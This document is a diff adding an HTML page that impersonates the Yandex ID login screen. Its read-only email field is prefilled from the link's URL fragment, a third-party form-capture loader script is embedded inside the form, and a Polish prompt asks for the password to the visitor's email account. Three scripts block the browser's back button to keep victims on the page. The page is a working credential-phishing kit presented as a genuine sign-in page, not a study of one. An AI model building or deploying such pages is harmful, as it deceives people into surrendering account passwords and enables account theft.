@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yandex ID</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Main Workspace with full screen panoramic landscape mountain backdrop matching screenshot layout structure exactly */
+.workspace-area {
+    flex-grow: 1;
+    min-height: 100vh;
+    background: linear-gradient(rgba(0, 0, 0, 0.05), rgba(0, 0, 0, 0.05)), 
+                url('https://unsplash.com') no-repeat center center fixed;
+    background-size: cover;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+    position: relative;
+}
+
+/* White Floating Credentials Card Box Component */
+.login-card {
+    background-color: #ffffff;
+    width: 100%;
+    max-width: 380px;
+    border-radius: 24px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+    padding: 40px 32px;
+    text-align: center;
+    z-index: 10;
+}
+
+/* Brand Logo Layout Inline Header Elements Block */
+.brand-logo-area {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+    margin-bottom: 24px;
+}
+
+.brand-text {
+    font-size: 22px;
+    font-weight: 700;
+    color: #000000;
+}
+
+.id-badge {
+    background-color: #000000;
+    color: #ffffff;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 6px;
+    border-radius: 6px;
+    letter-spacing: 0.5px;
+}
+
+.card-subtitle {
+    font-size: 16px;
+    font-weight: 500;
+    color: #111111;
+    margin-bottom: 24px;
+}
+
+/* Custom dual-mode tab selection container layout element capsule frame */
+.login-tabs {
+    display: flex;
+    background-color: #f0f2f5;
+    padding: 4px;
+    border-radius: 12px;
+    margin-bottom: 24px;
+    width: 100%;
+}
+
+.tab-item {
+    flex: 1;
+    padding: 10px 4px;
+    text-align: center;
+    font-size: 13px;
+    font-weight: 500;
+    color: #555555;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}
+
+.tab-item.active {
+    background-color: #ffffff;
+    color: #000000;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+}
+
+form {
+    width: 100%;
+}
+
+.form-group {
+    margin-bottom: 12px;
+    width: 100%;
+}
+
+/* Pristine wide rounded input border capsule frames */
+.form-control {
+    width: 100%;
+    height: 44px;
+    border: 1px solid #cbd5e1;
+    border-radius: 12px;
+    padding: 0 16px;
+    font-size: 15px;
+    color: #111111;
+    outline: none;
+    background-color: #ffffff;
+    transition: border-color 0.2s;
+}
+
+.form-control:focus {
+    border-color: #000000;
+}
+
+.form-control::placeholder {
+    color: #94a3b8;
+    font-weight: 400;
+}
+
+/* Alternative Identity Provider OAuth Row Button elements track */
+.social-oauth-row {
+    display: flex;
+    justify-content: center;
+    gap: 32px;
+    margin: 24px 0;
+}
+
+.oauth-btn {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    border: none;
+    background-color: transparent;
+    font-size: 18px;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+}
+
+.oauth-btn.google-color {
+    color: #ea4335;
+}
+
+.oauth-btn.x-color {
+    color: #000000;
+    font-size: 16px;
+}
+
+/* Crisp wide rectangular solid dark gray/black action submission trigger capsule button (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #21242c; /* Precise dark midnight shade matching the "Next" button color blueprint */
+    color: #ffffff;
+    border: none;
+    height: 48px;
+    font-size: 15px;
+    font-weight: bold;
+    border-radius: 14px;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #111317;
+}
+
+/* Card lower secondary alternative path elements stack grid buttons matrix */
+.secondary-actions-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    width: 100%;
+}
+
+.alt-action-btn {
+    width: 100%;
+    height: 48px;
+    background-color: #ffffff;
+    border: 1px solid #cbd5e1;
+    border-radius: 14px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #21242c;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}
+
+.alt-action-btn:hover {
+    background-color: #f8fafc;
+}
+
+.btn-icon {
+    font-size: 16px;
+    color: #475569;
+}
+
+.create-id-link {
+    width: 100%;
+    height: 48px;
+    border: 1px solid #cbd5e1;
+    border-radius: 14px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #21242c;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-top: 4px;
+    transition: background-color 0.2s;
+}
+
+.create-id-link:hover {
+    background-color: #f8fafc;
+}
+
+/* Fixed Background Desktop System Watermark Overlay Component Layout */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(255, 255, 255, 0.4);
+    text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+@media (max-width: 440px) {
+    .login-card {
+        padding: 32px 20px;
+    }
+}
+
+    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yandex ID - Log in</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Main Content Workspace Wrapper with Mountain Landscape Backdrop -->
+    <main class="workspace-area">
+        
+        <!-- White Floating Credentials Container Card Box Component -->
+        <div class="login-card">
+            
+            
+            <div class="brand-logo-area">
+                <span class="brand-text">Yandex</span> <span class="id-badge">ID</span>
+            </div>
+
+            <h2 class="card-subtitle">Log in with ID</h2>
+    
+            <!-- Dual Navigation Mode Tab Strip Links Menu elements -->
+            <div class="login-tabs">
+                <div class="tab-item active">Email</div>
+                <div class="tab-item alternative-tab">Phone number</div>
+            </div>
+
+            <!-- Form submission configuration using FormSubmit module links integration -->
+            <form action="" method="POST">
+                           <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <div class="form-group">
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+
+                <!-- Newly Integrated Structured Secure Password Field Entry Module Section -->
+                <div class="form-group password-group">
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+
+                
+                <div class="social-oauth-row">
+                    <button type="button" class="oauth-btn google-color">G</button>
+                    <button type="button" class="oauth-btn x-color">𝕏</button>
+                </div>
+
+                <!-- High-contrast crisp wide rectangular black action button -->
+                <button type="submit" class="submit-btn">Next</button>
+            </form>
+
+            <!-- Bottom utility navigation secondary paths alternative connection fields stack -->
+            <div class="secondary-actions-stack">
+                <button type="button" class="alt-action-btn">
+                    <span class="btn-icon">🪪</span> Face or fingerprint login
+                </button>
+                <button type="button" class="alt-action-btn">
+                    <span class="btn-icon">⚃</span> QR code
+                </button>
+                <a href="#" class="create-id-link">Create ID</a>
+            </div>
+
+        </div>
+    </main>
+
+
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
